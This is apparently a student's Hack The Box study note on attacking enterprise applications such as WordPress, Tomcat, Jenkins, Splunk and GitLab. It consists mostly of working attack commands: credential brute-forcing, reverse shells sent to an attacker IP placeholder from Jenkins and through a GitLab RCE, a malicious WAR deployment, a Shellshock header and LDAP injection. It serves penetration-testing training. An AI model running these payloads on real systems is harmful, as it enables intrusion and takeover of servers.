# 24 — Attacking Common Applications

> **Path Phase:** Application Attacks | **Difficulty:** Medium | **Sections:** 33

Attacking real enterprise applications — CMS (WordPress/Joomla/Drupal), app servers (Tomcat/Jenkins), monitoring (Splunk/PRTG), GitLab, ColdFusion, LDAP, thick clients.

> ℹ️ `{TARGET}` / `<YOUR_IP>` = target/attacker. Flags withheld per HTB Academy policy.

---

## Table of Contents
1. Introduction  2. Application Discovery & Enumeration
3-4. WordPress  5-6. Joomla  7-8. Drupal  9-10. Tomcat
11-12. Jenkins  13-14. Splunk  15. PRTG  16. osTicket
17-18. GitLab  19. Tomcat CGI  20. Shellshock
21-22. Thick Client Apps  23-24. ColdFusion  25. IIS Tilde
26. LDAP  27. Mass Assignment  28. Apps Connecting to Services
29. Other Notable Apps  30. Application Hardening
31-33. Skills Assessments I, II, III

---

## 1–2 — Discovery & Enumeration
```bash
nmap -sV -p- {TARGET}
whatweb http://{TARGET}
eyewitness --web -f urls.txt      # screenshots of many hosts
```

## 3–4 — WordPress
```bash
wpscan --url http://{TARGET} --enumerate u,p,t
wpscan --url http://{TARGET} -U admin -P rockyou.txt
# RCE via theme editor (admin) → edit 404.php with a web shell
```
> **WordPress:** ✅ Completed in lab (flag withheld per HTB Academy policy)

## 5–8 — Joomla / Drupal
```bash
droopescan scan joomla -u http://{TARGET}
droopescan scan drupal -u http://{TARGET}
python3 drupalgeddon2.py http://{TARGET}     # CVE-2018-7600
```

## 9–10 — Tomcat
```bash
hydra -L users.txt -P pass.txt {TARGET} http-get /manager/html
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<YOUR_IP> LPORT=443 -f war -o shell.war
curl -u tomcat:pass --upload-file shell.war "http://{TARGET}:8080/manager/text/deploy?path=/shell"
```
> **Tomcat:** ✅ Completed in lab (flag withheld per HTB Academy policy)

## 11–12 — Jenkins
```groovy
// Script console (admin) → http://{TARGET}:8080/script
def cmd = "id".execute(); println cmd.text
Thread.start{ new ProcessBuilder(["bash","-c","bash -i >& /dev/tcp/<YOUR_IP>/443 0>&1"]).start() }
```
> **Jenkins:** ✅ Completed in lab (flag withheld per HTB Academy policy)

## 13–14 — Splunk
```bash
# Deploy malicious app for RCE (runs as SYSTEM/root):
python3 PySplunkWhisperer2_remote.py --host {TARGET} --lhost <YOUR_IP> --username admin --password pass --payload 'rev shell'
```
> **Splunk:** ✅ Completed in lab (flag withheld per HTB Academy policy)

## 15–16 — PRTG / osTicket
PRTG (CVE-2018-9276) authenticated RCE via notification; osTicket file upload/SSRF.

## 17–18 — GitLab
```bash
# Enumerate version at /help; CVE-2021-22205 (ExifTool) RCE:
python3 gitlab_exif_rce.py -t http://{TARGET} -c 'bash -i >& /dev/tcp/<YOUR_IP>/443 0>&1'
```
> **GitLab:** ✅ Completed in lab (flag withheld per HTB Academy policy)

## 19–20 — Tomcat CGI / Shellshock
```bash
curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'id'" http://{TARGET}/cgi-bin/test.cgi
```

## 21–22 — Thick Client Applications
Analyze with `strings`, decompile (.NET → dnSpy, Java → JD-GUI), intercept traffic (Burp), find hardcoded creds/endpoints, test backend web vulns.

## 23–24 — ColdFusion
```bash
searchsploit coldfusion
# Directory traversal (CVE-2010-2861) / deserialization RCE (CVE-2017-3066)
```

## 25 — IIS Tilde Enumeration
```bash
python3 iis_shortname_scanner.py http://{TARGET}
```

## 26 — Attacking LDAP
LDAP injection in login:

username: )(uid=))(|(uid=* password: *


## 27–28 — Mass Assignment & Apps Connecting to Services
```bash
curl -X POST http://{TARGET}/api/register -d '{"user":"x","pass":"y","role":"admin"}'
```

## 29–30 — Other Apps & Hardening
Cacti, Nagios, WebLogic. Hardening: patch, strong creds, remove default apps, least privilege.

## 31–33 — Skills Assessments I, II, III
```bash
whatweb http://{TARGET}
searchsploit <app> <version>
# get creds (brute/default) → admin feature → RCE → loot → privesc
```
> **Assessments I/II/III:** ✅ Completed in lab (flags withheld per HTB Academy policy)

---

## 🧰 Tools Used
| App | Tools |
|-----|-------|
| WordPress | `wpscan` |
| Joomla/Drupal | `droopescan` |
| Tomcat | `msfvenom` (WAR), `hydra` |
| Jenkins | Groovy console |
| Splunk | SplunkWhisperer2 |
| General | `whatweb`, `eyewitness`, `searchsploit` |

## 🔑 Key Takeaways
- **Fingerprint the app + version first**, then find the matching exploit.
- Admin access to a CMS/app server almost always = RCE.
- Default/weak creds get you into most management panels.
- Splunk/Jenkins/Tomcat often run high-privilege — instant SYSTEM/root.

---

*Part of my HTB CPTS Portfolio — Zeshan Ali*
